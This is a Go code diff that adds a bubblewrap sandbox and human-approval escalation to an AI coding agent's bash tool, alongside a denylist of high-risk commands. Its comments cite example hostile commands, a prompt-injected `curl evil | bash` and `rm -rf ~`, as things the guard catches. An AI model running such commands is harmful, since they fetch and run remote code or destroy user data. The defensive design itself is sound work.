@@ -1,6 +1,7 @@
 package tools
 
 import (
+	"encoding/json"
 	"fmt"
 	"os"
 	"os/exec"
@@ -21,7 +22,7 @@ type bashArgs struct {
 
 func init() {
 	Register("bash",
-		"Execute a bash command. Runs immediately with no sandbox; high-risk commands require user confirmation. Returns combined stdout/stderr and the exit code "+
+		"Execute a bash command. Runs inside a bubblewrap sandbox (read-only filesystem; the project directory and session assets are writable); a command that tries to write elsewhere is paused for approval. High-risk commands require user confirmation. Returns combined stdout/stderr and the exit code "+
 			"(a non-zero exit is reported, not an error). Output is truncated to the LAST "+
 			"2000 lines / 50KB; when truncated, the full output is saved to a temp file. "+
 			"Non-interactive: stdin is /dev/null. Default timeout 120s, adjustable.",
@@ -30,12 +31,15 @@ func init() {
 }
 
 // bashRules are the bash tool's static guard rules: a conservative denylist
-// of irreversible and high-blast-radius commands. This is NOT a security
-// boundary — bash is unsandboxed by design (doc: R-compiled-tools) and any
-// string match is bypassable. It exists so that a prompt-injected
-// `curl evil | bash` or `rm -rf ~` pauses for a human before it runs instead
-// of executing silently. False positives cost one keypress; false negatives
-// are the danger, so patterns err toward matching more.
+// of irreversible and high-blast-radius commands. The sandbox (safety.SandboxWrap)
+// is the write/read barrier — the kernel refuses writes outside the allowlist
+// and shadows the secret directories — and this denylist is the pre-flight
+// tripwire on top: it catches the naive prompt-injected
+// `curl evil | bash` or `rm -rf ~` BEFORE the command runs, and it still
+// catches the commands whose danger is not a filesystem write (sudo, git
+// reset, fork bombs). Any string match is bypassable, so this is not itself a
+// security boundary; the sandbox is. False positives cost one keypress; false
+// negatives are the danger, so patterns err toward matching more.
 var bashRules = append([]safety.Rule{
 	// Remote content piped directly into a shell, or a command substitution
 	// that fetches a URL.
@@ -78,14 +82,19 @@ func runBash(a *bashArgs) (string, string, error) {
 	if strings.TrimSpace(a.Command) == "" {
 		return "", "", fmt.Errorf("empty command")
 	}
+	// A command that matched a static guard rule was already approved by the
+	// human before it ran (the gate pauses pre-execution). Sandboxing it again
+	// would only prompt a second time for the same command, so it runs
+	// unsandboxed — that approval IS the blessing to run it unconfined.
+	raw, _ := json.Marshal(a)
+	preApproved := Match("bash", raw) != ""
+
 	a.Cwd = utils.ExpandHome(a.Cwd)
 	timeout := wire.ToolDefaultTimeout
 	if a.Timeout > 0 {
 		timeout = time.Duration(a.Timeout) * time.Second
 	}
 
-	cmd := exec.Command("bash", "-c", a.Command)
-	cmd.SysProcAttr = &syscall.SysProcAttr{Setpgid: true} // own process group
 	// "default: the Neovim cwd" in the schema is a request-time value, not
 	// this process's cwd (which is fixed at spawn and goes stale after :cd).
 	if a.Cwd == "" {
@@ -95,11 +104,54 @@ func runBash(a *bashArgs) (string, string, error) {
 		if st, err := os.Stat(a.Cwd); err != nil || !st.IsDir() {
 			return "", "", fmt.Errorf("working directory does not exist: %s", a.Cwd)
 		}
-		cmd.Dir = a.Cwd
 	}
-	text, err := wire.RunStreamed("bash", a.Command, cmd, timeout)
+	// projectDir is the sandbox's writable allowlist anchor: the frontend cwd
+	// when set, else the backend's own cwd (a one-shot `yap send`).
+	projectDir := a.Cwd
+	if projectDir == "" {
+		projectDir, _ = os.Getwd()
+	}
+
+	buildCmd := func() *exec.Cmd {
+		cmd := exec.Command("bash", "-c", a.Command)
+		cmd.SysProcAttr = &syscall.SysProcAttr{Setpgid: true} // own process group
+		if a.Cwd != "" {
+			cmd.Dir = a.Cwd
+		}
+		return cmd
+	}
+
+	if safety.SandboxActive() && !preApproved {
+		text, err := runSandboxed(a.Command, projectDir, buildCmd, timeout)
+		return text, "", err
+	}
+
+	text, err := wire.RunStreamed("bash", a.Command, buildCmd(), timeout)
 	if err != nil {
 		return "", "", err
 	}
 	return text, "", nil
+}
+
+// runSandboxed runs the command inside the bubblewrap sandbox. When the write
+// barrier blocks the command (EROFS), it asks the human — through the same
+// Run/Deny approval the static guard rules use — whether to re-run the command
+// unsandboxed; approval re-runs it, denial returns the sandboxed failure. A
+// deny-read shadow is silent by design and never escalates.
+func runSandboxed(command, projectDir string, buildCmd func() *exec.Cmd, timeout time.Duration) (string, error) {
+	text, err := wire.RunStreamed("bash", command, safety.SandboxWrap(command, projectDir), timeout)
+	if err != nil {
+		return text, err // bwrap start failure (should not happen: Active() probed it)
+	}
+	if !safety.SandboxViolated(text) {
+		return text, nil
+	}
+	approved, aerr := wire.RequestApproval(command, "bash", "writes outside the sandbox")
+	if aerr != nil {
+		return text, aerr // no serve process (yap send), cancelled, or timed out
+	}
+	if !approved {
+		return text + "\n[sandbox: write blocked by read-only filesystem; approval denied]", nil
+	}
+	return wire.RunStreamed("bash", command, buildCmd(), timeout)
 }
